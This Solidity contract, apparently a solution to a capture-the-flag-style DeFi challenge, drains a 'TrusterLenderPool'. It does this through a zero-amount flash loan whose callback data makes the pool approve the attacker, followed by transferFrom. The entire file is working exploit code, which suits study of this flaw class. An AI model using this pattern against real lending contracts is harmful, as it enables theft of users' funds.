// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../TrusterLenderPool.sol";

contract TrusterAttacker {

    function drainLenderPool(address _token, address _pool, uint256 amount, address attacker) external {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        // We don't actually have to borrow anything
        pool.flashLoan(0, address(this), _token, abi.encodeWithSignature("approve(address,uint256)", address(this),
            amount));

        token.transferFrom(_pool, attacker, amount);
    }

}